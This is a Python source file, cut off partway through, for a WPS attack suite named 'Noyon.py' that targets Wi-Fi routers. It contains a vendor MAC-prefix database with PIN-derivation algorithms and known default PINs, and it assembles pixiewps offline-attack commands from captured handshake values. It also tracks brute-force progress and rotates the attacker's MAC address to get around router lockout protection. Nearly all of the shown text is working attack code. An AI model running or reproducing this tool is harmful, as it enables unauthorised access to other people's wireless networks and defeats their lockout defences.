#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Noyon.py — ULTRA ENGINE WPS Attack Suite
# Author: Noyon | Owner: @NOYONRRP | Channel: @mohammad_noyon_rrp
# Architecture: External Engines | AutoChain | Lock Guard | MAC Rotation

import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
import threading
import random
from abc import ABC, abstractmethod
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
import collections
import statistics
import csv
import json
from pathlib import Path
from typing import Dict, Optional, List, Union, Tuple

try:
    import wcwidth
except ImportError:
    wcwidth = None

try:
    from pyfiglet import Figlet
except ImportError:
    Figlet = None


class Config:
    WPA_SUPPLICANT_TIMEOUT = 15
    WPS_TRANSACTION_TIMEOUT = 90
    SOCKET_TIMEOUT = 8
    PIXIEWPS_TIMEOUT = 45
    SCAN_TIMEOUT = 45
    WPS_FAIL_THRESHOLD = 3
    MAC_ROTATION_ENABLED = True
    MAC_ROTATION_DELAY = 5
    LOCK_COOLDOWN = 30
    MAX_LOCK_RETRIES = 5
    PSK_RETRY_COUNT = 3
    PSK_RETRY_DELAY = 10
    BRUTEFORCE_DEFAULT_DELAY = 1.0
    BRUTEFORCE_FAIL_PAUSE = 5


# ═══════════════════════════════════════════════════════════════════
#  UI — FIXED (Normal colors, Termux-safe)
# ═══════════════════════════════════════════════════════════════════
class UI:
    RESET = '\033[0m'; BOLD = '\033[1m'; DIM = '\033[2m'
    GREEN = '\033[32m'; RED = '\033[31m'; YELLOW = '\033[33m'
    CYAN = '\033[36m'; MAGENTA = '\033[35m'; WHITE = '\033[37m'; GRAY = '\033[90m'

    @staticmethod
    def ok(m): print(f'{UI.GREEN}[+]{UI.RESET} {m}')
    @staticmethod
    def err(m): print(f'{UI.RED}[!]{UI.RESET} {m}')
    @staticmethod
    def warn(m): print(f'{UI.YELLOW}[*]{UI.RESET} {m}')
    @staticmethod
    def info(m): print(f'{UI.CYAN}[i]{UI.RESET} {m}')
    @staticmethod
    def pixie(m): print(f'{UI.MAGENTA}[P]{UI.RESET} {m}')
    @staticmethod
    def lock(m): print(f'{UI.RED}[LOCK]{UI.RESET} {m}')
    @staticmethod
    def stage(m): print(f'{UI.CYAN}{UI.BOLD}▸ {m}{UI.RESET}')
    @staticmethod
    def plain(m=''): print(m)
    @staticmethod
    def divider(): print(f'{UI.GRAY}{"─" * 55}{UI.RESET}')
    @staticmethod
    def section(t):
        print()
        print(f'{UI.CYAN}{UI.BOLD}▸ {t}{UI.RESET}')
        print(f'{UI.GRAY}{"─" * 55}{UI.RESET}')


# ═══════════════════════════════════════════════════════════════════
#  MAC
# ═══════════════════════════════════════════════════════════════════
class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC must be string or integer')

    @property
    def string(self): return self._str_repr
    @property
    def integer(self): return self._int_repr
    def __int__(self): return self.integer
    def __str__(self): return self.string
    def __iadd__(self, o):
        self._int_repr += o
        self._str_repr = self._int2mac(self._int_repr)
        return self
    def __eq__(self, o): return isinstance(o, NetworkAddress) and self.integer == o.integer
    def __hash__(self): return hash(self.integer)

    @staticmethod
    def _mac2int(m): return int(m.replace(':', ''), 16)

    @staticmethod
    def _int2mac(m):
        h = hex(m).split('x')[-1].upper().zfill(12)
        return ':'.join(h[i:i + 2] for i in range(0, 12, 2))

    @staticmethod
    def random_mac(oui='02'):
        parts = [oui.zfill(2).upper()]
        for _ in range(5):
            parts.append(f'{random.randint(0, 255):02X}')
        return ':'.join(parts)


def _str_width(s):
    if wcwidth is not None:
        w = wcwidth.wcswidth(s)
        return w if w >= 0 else len(s)
    return len(s)


def truncate(s, length, postfix='…'):
    ow = _str_width(s)
    if ow <= length:
        return s + ' ' * (length - ow)
    pw = _str_width(postfix)
    max_a = length - pw
    cw, tr = 0, []
    for c in s:
        c_w = _str_width(c)
        if cw + c_w > max_a:
            break
        tr.append(c)
        cw += c_w
    r = ''.join(tr)
    if len(tr) < len(s):
        r += postfix
    return r + ' ' * max(0, length - _str_width(r))


# ═══════════════════════════════════════════════════════════════════
#  WPS PIN GENERATOR
# ═══════════════════════════════════════════════════════════════════
class WPSpin:
    ALGO_MAC = 0; ALGO_EMPTY = 1; ALGO_STATIC = 2

    VENDOR_DATABASE = {
        'TP-Link': ('5464D9', '1C3BF3', '60E327', 'B0487A', 'F81A67', 'F8D111',
            '50465D', '788CF5', 'C025E9', '0023CD', '0024B2', '002719',
            '105172', '147CB8', '18909F', '349672', '3C6A2A', '403F8C',
            '485D60', '503CC8', '5465F3', '60E32B', '645299', '74EA3A',
            '8481F4', '90671C', '989ECE', 'A42B8C', 'AC15A2', 'B0BE76',
            'C005C2', 'CC2D8C', 'D807B6', 'E4D3F1', 'E8DE27', 'EC086B',
            'F483CD', '18A6F7', '3C46D8', '704F57', '7C8BCA', '90F652',
            'C074AD', 'CE3D82', 'DC028E', '1027F5', '1C61B4', '30DE4B',
            '54AF97', '002275', '08863B', '081075', '0026CE', '9897D1',
            'E04136', 'B246FC', '0008A1', 'C4A81D', '9094E4', 'BCF685',
            '50CCF8', '841630', '14CC20', '34BA9A', 'B4944E', '001D0F',
            '002127', '68FF7B', '98DAC4', '9C5322', 'B09575', 'CC81DA',
            'E4C32A', '000AEB', '001333', '001839', '001A2F', '001B2F',
            '001E2A', '00223F', '002586', '003192', '502B73'),
        'Tenda': ('C83A35', '502B73', 'C86C87', 'E8CD2D', '00B00C', 'CC81DA',
                  '803F5D', '685B35', 'D8322E', 'E03676', 'E47185', 'F0B429',
                  '14CF92', '288088', '58D56E', '8C68C8'),
        'Netis': ('84C9B2', '0002CF', 'EF54C1', 'ACF832', '1062EB', '94A7B7', '44946F'),
        'Xiaomi': ('64CC2E', '7811DC', 'F8A45F', '50642B', 'FC64BA', '286C07', '8C53C3', '04CF8C'),
        'Xiaomi-MiWiFi': ('28D127', '50EC50', '8CBEBE'),
        'ZTE': ('386171', '001915', '3448ED', '600308', '88E3AB', '9C1C12',
                'AC63F9', 'CC96A0', 'F46D04', 'FC64BA', '002293', '002542',
                '2053ED', '68A0F6', '80797A', 'D85D4C'),
        'Huawei': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED',
                   '2469A5', '346BD3', '786A89', '9CC172', 'ACE215', 'D07AB5',
                   'CCA223', 'F80113', 'F83DFF', '4C09B4', '4CAC0A', '84742A',
                   '9CD24B', 'B075D5', 'C864C7', 'DC028E'),
        'Mercury': ('1CBDB9', '349672', '50FA84', '687724', 'E894F6'),
        'Phicomm': ('F88C21', 'E04F43', '342109', 'A06FAA'),
        'TotoLink': ('4C9EFF', 'B0C554', 'C4E984', 'D4D7A9', 'F0F249'),
        'iBall': ('9C3426', 'B0E235', 'D8E56D'),
        'Digisol': ('000AF7', '002191'),
        'Beetel': ('0019E0', '002586', '3822E2'),
        'Wavlink': ('80EA96', 'C0A5DD', 'E0B94D'),
        'Netgear': ('204E7F', 'A040A0', 'B03956', 'C03F0E', 'DCEF09', 'E0469A',
                    'E8FCAF', 'F87394', '28C68E', '4494FC', '744401', '9C3DCF'),
        'Linksys': ('149182', '20AA4B', '48F8B3', '586D8F', '6038E0', '687F74',
                    '94103E', 'C05627', 'E89F80', 'F4EC38'),
        'Belkin': ('08863B', '34E894', '58EF68', '944452', 'B4750E', 'EC1A59'),
        'Buffalo': ('000D0B', '001601', '001D73', '106F3F', '3412C0', '4CE676', 'A4AB9C', 'DCFB02'),
        'Motorola': ('000CE5', '00111A', '001A1B', '001CBE', '00228A', '405FC2', '74E543', 'A47B2C'),
        'Arris': ('001596', '001DCF', '00235E', '002495', '100D7F', '1C1B68', '3C7A8A', '4432C8'),
        'SMC': ('0004E2', '0013F7', '001E8C', '0022B0', 'B870F4', 'E09153'),
        'Ruckus': ('001392', '001FE1', '24C9A1', '2C5D93', '50A733', 'C08ADE', 'EC8EAE'),
        'USRobotics': ('000476', '000E2E', '001346', '00179A', '002233'),
        'Hawking': ('000E2E', '00179A', '0022B0'),
        'IOGear': ('000E2E', '00179A', 'F0F249'),
        'Zoom': ('000E2E', '00179A', 'C8D3A3'),
        'Ambit': ('000E2E', '00179A', 'B8A386'),
        'Western-Digital': ('0090A9', 'A4D1D2', 'C8D3A3'),
        'Airocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '001AEF',
                    '00E04BB3', '02101801', '0810734', '08107710', '1013EE0',
                    '2CAB25C7', '788C54', '803F5DF6', 'F43E61'),
        'Sagemcom': ('001E80', '00246E', '347E5C', '68A378', '7C03D8', 'C891F9', 'F88E85'),
        'Thomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
        'Pirelli': ('001CA6', '001E0A', '00228C', '34332A', '70723C', 'A01B29'),
        'Atlantis': ('001CF0', '00222D'),
        'Sitecom': ('000CF6', '0018E7', '001E58', '002191', '002421'),
        'AirTies': ('001A2B', '00246E', '28C68E', '9CC7A6'),
        'DrayTek': ('00507F', '00179A', 'C8D3A3'),
        'Billion': ('000AF7', '00179A', 'D8E56D'),
        'NetComm': ('000AF7', '00179A', '001E58'),
        'Repotec': ('000AF7', '00179A', '001CF0'),
        'Sapido': ('000AF7', '00179A', 'C8D3A3'),
        'SparkLAN': ('000AF7', '00179A'),
        'Tecom': ('000AF7', '00179A', '001E58'),
        'Aztech': ('000AF7', '00179A', '001CF0'),
        'Corega': ('000AF7', '00179A', '002191'),
        'Broadcom': ('ACF1DF', '988B5D', '001AA9', '14144B', 'EC6264', 'B8A386',
                     'C8BE19', '7C034C', '204E7F', '4C17EB', '18622C', '7C03D8'),
        'Realtek': ('000C42', '000EE8', '007263', 'E4BEED', '08C6B3'),
        'Ralink': ('000C43', '000E2E', '00177C', '7CDD90', '9C417C'),
        'Atheros': ('00037F', '001374', '00156D', '001B2F', '04F021'),
        'Trendchip': ('00037F', '001374', 'C8D3A3'),
        'MediaTek': ('000C43', '00177C', '18A6F7', '4C49E3'),
        'D-Link': ('14D64D', '1C7EE5', '28107B', 'A0AB1B', 'B8A386', 'C0A0BB',
                   'CCB255', 'FC7516', 'D8EB97', '0018E7', '00195B', '001CF0',
                   '001E58', '002191', '0022B0', '002401', '00265A', '340804',
                   '5CD998', 'C8BE19', 'C8D3A3', '0015E9', '00179A'),
        'D-Link v1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0',
                      '002401', '00265A', '340804', '5CD998', 'C8BE19', 'C8D3A3'),
        'ASUS': ('049226', '04D9F5', '08606E', '107B44', '10BF48', '10C37B',
                 '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A',
                 '382C4A', '38D547', '40167E', '54A050', '6045CB', '60A44C',
                 '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B',
                 'AC9E17', 'B06EBF', 'BCEE7B', 'D017C2', 'D850E6', 'E03F49',
                 'F832E4', '00177C', '001EA6', '048D38', '081077', '081078',
                 '081079', '083E5D', '181E78', '1C4419', '2420C7', '247F20',
                 '3C1E04', '40F201', '44E9DD', '54B80A', '64517E', '64D954',
                 '6C198F', '6C7220', '6CFDB9', '7C2664', '84A423', '88A6C6',
                 '8C10D4', '904D4A', '907282', '94FBB2', 'A01B29', 'ACA213',
                 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'E4BEED', 'EC4C4D',
                 'F42853', 'F43E61', 'F46BEF', 'F8AB05', '7062B8', '78542E',
                 'C412F5', 'EC2280'),
        'Ubiquiti': ('002722', '0418D6', '24A43C', '44D9E7', '687251', '74ACB9',
                     '788A20', '802AA8', 'B4FBE4', 'DC9FDB', 'E063DA', 'F09FC2', 'FCECDA'),
        'MikroTik': ('000C42', '18FD74', '48A98A', '4C5E0C', '64D154', '6C3B6B',
                     '744D28', '78A3E4', 'B869F4', 'C4AD34', 'CC2DE0', 'DC2C6E', 'E48D8C'),
        'Fortinet': ('00090F', '085B0E', '70106F', '90B11C', 'E08175'),
        'Senao': ('00179A', '001AEF', '0022B0', '002586'),
        'Gigabyte': ('000D61', '40A3CC', '94DE80', 'C8BE19'),
        'Cisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
        'Edimax': ('801F02', '00E04C', '74DA38', 'C4E984'),
        'ONO': ('5C353B', 'DC537C'),
        'Upvel': ('784476', 'D4BF7F0', 'F8C091'),
        'Onlime': ('D4BF7F', 'F8C091', '144D67', '0014D1'),
        'UR-814AC': ('D4BF7F60',),
        'UR-825AC': ('D4BF7F5',),
        'DSL-2740R': ('00265A', '1CBDB9'),
        'H108L': ('4C09B4', '4CAC0A', '84742A', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
        'TRENDnet': ('0014D1', '001E58', '0022B0', '002401', 'C8D3A3'),
        'EnGenius': ('00026F', '000E8E', '001F1F', '002275', '0024A5', 'C8BE19', 'D4BF7F'),
        'ZyxEL': ('001349', '0019CB', '0023F8', '00A0C5', '28285D', '404A03', '588BF3', '90EF68'),
        'Comtrend': ('001D20', '001E1C', '00235E', '3872C0', '6466B3', 'A01B29', 'F88E85'),
        'Planet': ('00304F', '000E5C'),
        'LevelOne': ('000F3D', '00148C'),
        '3Com': ('000102', '000475', '000D54', '00104B', '00159A', '0050DA', '00608C', '006B8E'),
        'Lapcare': ('000AF7', '00179A'),
        'Ubee': ('388345', '64ED57', '84E058', 'C0C1C0', 'F8E7B5'),
        'Hitron': ('001EE5', '0026B8', '445829', 'B85810'),
        'Compal': ('001CF0', '84E058', 'C0C1C0'),
        'Askey': ('60A4D0', '8C5A25', 'A025D7'),
    }

    VENDOR_ALGO = {
        'TP-Link': 'pin24', 'Tenda': 'pin24', 'Netis': 'pin24',
        'Xiaomi': 'pin24', 'Xiaomi-MiWiFi': 'pin24', 'ZTE': 'pin24',
        'Huawei': 'pin24', 'Mercury': 'pin24', 'Phicomm': 'pin24',
        'TotoLink': 'pin24', 'iBall': 'pin24', 'Digisol': 'pin24',
        'Beetel': 'pin24', 'Wavlink': 'pin24', 'Netgear': 'pin24',
        'Linksys': 'pin24', 'Belkin': 'pin24', 'Buffalo': 'pin24',
        'Motorola': 'pin24', 'Arris': 'pin24', 'SMC': 'pin24',
        'Ruckus': 'pin24', 'USRobotics': 'pin24', 'Hawking': 'pin24',
        'IOGear': 'pin24', 'Zoom': 'pin24', 'Ambit': 'pin24',
        'Western-Digital': 'pin24', 'Sagemcom': 'pin24', 'Pirelli': 'pin24',
        'Atlantis': 'pin24', 'Sitecom': 'pin24', 'AirTies': 'pin24',
        'DrayTek': 'pin24', 'Billion': 'pin24', 'NetComm': 'pin24',
        'Repotec': 'pin24', 'Sapido': 'pin24', 'SparkLAN': 'pin24',
        'Tecom': 'pin24', 'Aztech': 'pin24', 'Corega': 'pin24',
        'Ralink': 'pin24', 'Atheros': 'pin24', 'Trendchip': 'pin24',
        'MediaTek': 'pin24', 'Ubiquiti': 'pin24', 'MikroTik': 'pin24',
        'Fortinet': 'pin24', 'Senao': 'pin24', 'Gigabyte': 'pin24',
        'TRENDnet': 'pin24', 'EnGenius': 'pin24', 'ZyxEL': 'pin24',
        'Comtrend': 'pin24', 'Planet': 'pin24', 'LevelOne': 'pin24',
        '3Com': 'pin24', 'Lapcare': 'pin24', 'Ubee': 'pin24',
        'Hitron': 'pin24', 'Compal': 'pin24', 'Askey': 'pin24',
        'ASUS': 'pinASUS', 'Airocon': 'pinAirocon',
        'Broadcom': 'pinBrcm1', 'Realtek': 'pinRealtek1',
        'D-Link': 'pinDLink', 'D-Link v1': 'pinDLink1',
        'Cisco': 'pinCisco', 'Edimax': 'pinEdimax',
        'Thomson': 'pinThomson', 'ONO': 'pinONO',
        'Upvel': 'pinUpvel', 'Onlime': 'pinOnlime',
        'UR-814AC': 'pinUR814AC', 'UR-825AC': 'pinUR825AC',
        'DSL-2740R': 'pinDSL2740R', 'H108L': 'pinH108L',
    }

    def __init__(self):
        self.algos = {
            'pin24':       {'name': '24-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin24},
            'pin28':       {'name': '28-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin28},
            'pin32':       {'name': '32-bit PIN',       'mode': self.ALGO_MAC,    'gen': self.pin32},
            'pinDLink':    {'name': 'D-Link PIN',       'mode': self.ALGO_MAC,    'gen': self.pinDLink},
            'pinDLink1':   {'name': 'D-Link PIN +1',    'mode': self.ALGO_MAC,    'gen': self.pinDLink1},
            'pinASUS':     {'name': 'ASUS PIN',         'mode': self.ALGO_MAC,    'gen': self.pinASUS},
            'pinAirocon':  {'name': 'Airocon Realtek',  'mode': self.ALGO_MAC,    'gen': self.pinAirocon},
            'pinEmpty':    {'name': 'Empty PIN',        'mode': self.ALGO_EMPTY,  'gen': lambda mac: ''},
            'pinCisco':    {'name': 'Cisco',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1':    {'name': 'Broadcom 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2':    {'name': 'Broadcom 2',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3':    {'name': 'Broadcom 3',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4':    {'name': 'Broadcom 4',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5':    {'name': 'Broadcom 5',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6':    {'name': 'Broadcom 6',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1':    {'name': 'Airocon 1',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2':    {'name': 'Airocon 2',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel':    {'name': 'Upvel',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC':  {'name': 'UR-814AC',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC':  {'name': 'UR-825AC',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime':   {'name': 'Onlime',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax':   {'name': 'Edimax',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson':  {'name': 'Thomson',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x':   {'name': 'HG532x',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L':    {'name': 'H108L',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO':      {'name': 'CBN ONO',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
        }

    @classmethod
    def get_vendor(cls, mac):
        clean = mac.replace(':', '').upper()
        for vendor, ouis in cls.VENDOR_DATABASE.items():
            if clean.startswith(ouis):
                return vendor
        return 'Unknown'

    @staticmethod
    def checksum(pin):
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin //= 10
            accum += (pin % 10)
            pin //= 10
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        try:
            mac_obj = NetworkAddress(mac)
            if algo not in self.algos:
                raise ValueError(f'Invalid algorithm: {algo}')
            pin = self.algos[algo]['gen'](mac_obj)
            if algo == 'pinEmpty':
                return ''
            pin = pin % 10000000
            return f'{pin:07d}{self.checksum(pin)}'
        except Exception as e:
            UI.err(f'PIN gen failed ({algo}): {e}')
            return '12345670'

    def getSuggested(self, mac):
        return [{
            'id': ID,
            'name': ('Static — ' + self.algos[ID]['name'])
                    if self.algos[ID]['mode'] == self.ALGO_STATIC
                    else self.algos[ID]['name'],
            'pin': self.generate(ID, mac),
        } for ID in self._suggest(mac)]

    def getSuggestedList(self, mac):
        return [self.generate(a, mac) for a in self._suggest(mac)]

    def getLikely(self, mac):
        r = self.getSuggestedList(mac)
        return r[0] if r else None

    def _suggest(self, mac):
        clean = mac.replace(':', '').upper()
        suggested = ['pin24', 'pin28']
        for vendor, ouis in self.VENDOR_DATABASE.items():
            if clean.startswith(ouis):
                algo = self.VENDOR_ALGO.get(vendor)
                if algo and algo not in suggested:
                    suggested.append(algo)
                if vendor == 'D-Link' and 'pinDLink1' not in suggested:
                    suggested.append('pinDLink1')
                break
        return suggested

    def pin24(self, m): return m.integer & 0xFFFFFF
    def pin28(self, m): return m.integer & 0xFFFFFFF
    def pin32(self, m): return m.integer % 0x100000000

    def pinDLink(self, m):
        nic = m.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) + ((pin & 0xF) << 16) + ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, m):
        m += 1
        return self.pinDLink(m)

    def pinASUS(self, m):
        b = [int(i, 16) for i in m.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin) if pin else 0

    def pinAirocon(self, m):
        b = [int(i, 16) for i in m.string.split(':')]
        return ((b[0] + b[1]) % 10) + (((b[5] + b[0]) % 10) * 10) \
             + (((b[4] + b[5]) % 10) * 100) + (((b[3] + b[4]) % 10) * 1000) \
             + (((b[2] + b[3]) % 10) * 10000) + (((b[1] + b[2]) % 10) * 100000) \
             + (((b[0] + b[1]) % 10) * 1000000)


def get_hex(line):
    parts = line.split(':', 3)
    if len(parts) < 3:
        return ''
    return parts[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = self.pkr = self.e_hash1 = ''
        self.e_hash2 = self.authkey = self.e_nonce = ''

    def clear(self): self.__init__()

    def got_all(self):
        return bool(self.pke and self.pkr and self.e_nonce
                    and self.authkey and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        cmd = (f'pixiewps --pke {self.pke} --pkr {self.pkr} '
               f'--e-hash1 {self.e_hash1} --e-hash2 {self.e_hash2} '
               f'--authkey {self.authkey} --e-nonce {self.e_nonce}')
        if full_range:
            cmd += ' --force'
        return cmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.bssid = ''
        self.wps_disabled = False     # NEW: detected when router refuses WPS
        self.wps_unreachable = False  # NEW: no response at all

    def isFirstHalfValid(self): return self.last_m_message > 5
    def clear(self): self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        avg = statistics.mean(self.attempts_times) if self.attempts_times else 0
        pct = (int(self.mask) / 11000 * 100) if len(self.mask) == 4 \
            else ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        UI.info(f'{pct:.2f}% complete @ {self.start_time} ({avg:.2f} sec/pin)')

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        now = time.time()
        self.attempts_times.append(now - self.last_attempt_time)
        self.last_attempt_time = now
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()


class LockState(Enum):
    CLEAN = 'clean'
    WARNING = 'warning'
    LOCKED = 'locked'
    ROTATING = 'rotating'


@dataclass
class LockGuard:
    interface: str
    bssid: str
    original_mac: str = ''
    current_mac: str = ''
    fail_count: int = 0
    rotation_count: int = 0
    lock_detected_at: float = 0.0
    state: LockState = LockState.CLEAN

    def __post_init__(self):
        self.original_mac = self._get_interface_mac()

    def _get_interface_mac(self):
        try:
            r = subprocess.run(
                f'cat /sys/class/net/{self.interface}/address',
                shell=True, capture_output=True, text=True, timeout=3)
            return r.stdout.strip().upper()
        except Exception:
            return ''

    def record_success(self):
        self.fail_count = 0
        self.state = LockState.CLEAN

    def record_fail(self):
        self.fail_count += 1
        if self.fail_count >= Config.WPS_FAIL_THRESHOLD:
            self.state = LockState.LOCKED
            self.lock_detected_at = time.time()
        else:
            self.state = LockState.WARNING
        return self.state

    def is_locked(self):
        return self.state == LockState.LOCKED

    def rotate_mac(self):
        if not Config.MAC_ROTATION_ENABLED:
            UI.warn('MAC rotation disabled')
            return False
        if self.rotation_count >= Config.MAX_LOCK_RETRIES:
            UI.err(f'Max MAC rotations reached')
            return False

        self.state = LockState.ROTATING
        new_mac = NetworkAddress.random_mac(oui='02')
        UI.lock(f'Rotating MAC: {self.original_mac} → {new_mac}')

        try:
            subprocess.run(f'ip link set {self.interface} down',
                           shell=True, timeout=5, check=False)
            time.sleep(0.5)
            r = subprocess.run(
                f'ip link set {self.interface} address {new_mac}',
                shell=True, capture_output=True, text=True, timeout=5)
            if r.returncode != 0:
                UI.err(f'MAC change failed: {r.stderr.strip()}')
                subprocess.run(f'ip link set {self.interface} up',
                               shell=True, timeout=5, check=False)
                return False
            time.sleep(0.5)
            subprocess.run(f'ip link set {self.interface} up',
                           shell=True, timeout=5, check=False)
            time.sleep(1.5)

            self.current_mac = new_mac
            self.rotation_count += 1
            self.fail_count = 0
            self.state = LockState.CLEAN

            time.sleep(Config.MAC_ROTATION_DELAY)
            UI.ok(f'MAC rotated to {new_mac} (#{self.rotation_count})')
            return True
        except Exception as e:
            UI.err(f'MAC rotation error: {e}')
            return False

    def restore_mac(self):
        if not self.original_mac or not Config.MAC_ROTATION_ENABLED:
            return
        try:
            subprocess.run(f'ip link set {self.interface} down',
                           shell=True, timeout=5, check=False)
            subprocess.run(
                f'ip link set {self.interface} address {self.original_mac}',
                shell=True, timeout=5, check=False)
            subprocess.run(f'ip link set {self.interface} up',
                           shell=True, timeout=5, check=False)
            UI.info(f'MAC restored')
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════
#  COMPANION
# ═══════════════════════════════════════════════════════════════════
class Companion:
    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.bssid = bssid
        self.lastPwr = 0

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf',
                                         delete=False) as temp:
            temp.write(f'ctrl_interface={self.tempdir}\n'
                       f'ctrl_interface_group=root\nupdate_config=1\n')
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = (f"{tempfile.gettempdir()}/cox_"
                                f"{os.getpid()}_{int(time.time() * 1000)}")
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        if os.path.exists(self.res_socket_file):
            try:
                os.remove(self.res_socket_file)
            except OSError:
                pass
        self.retsock.bind(self.res_socket_file)
        self.retsock.settimeout(Config.SOCKET_TIMEOUT)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()
        self.lock_guard = LockGuard(interface=interface, bssid=bssid)

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.CodeX/sessions/'
        self.pixiewps_dir = f'{user_home}/.CodeX/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        for d in (self.sessions_dir, self.pixiewps_dir, self.reports_dir):
            os.makedirs(d, exist_ok=True)

        self.generator = WPSpin()

    def __init_wpa_supplicant(self):
        UI.warn('Running wpa_supplicant…')
        cmd = (f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired '
               f'-i{self.interface} -c{self.tempconf}')
        self.wpas = subprocess.Popen(cmd, shell=True,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT,
                                     encoding='utf-8', errors='replace')
        start = time.time()
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError(f'wpa_supplicant error: {self.wpas.communicate()[0] or ""}')
            if os.path.exists(self.wpas_ctrl_path):
                break
            if time.time() - start > Config.WPA_SUPPLICANT_TIMEOUT:
                raise TimeoutError('wpa_supplicant timeout')
            time.sleep(.1)

    def sendOnly(self, cmd):
        try:
            self.retsock.sendto(cmd.encode(), self.wpas_ctrl_path)
        except Exception as e:
            UI.err(f'sendOnly: {e}')

    def sendAndReceive(self, cmd):
        try:
            self.retsock.sendto(cmd.encode(), self.wpas_ctrl_path)
            b, _ = self.retsock.recvfrom(4096)
            return b.decode('utf-8', errors='replace')
        except socket.timeout:
            UI.err('Socket timeout')
            return ''
        except Exception as e:
            UI.err(f'sendAndReceive: {e}')
            return ''

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=''):
        if verbose is None:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                UI.info(f'Sending M{n}…')
            elif 'Received M' in line:
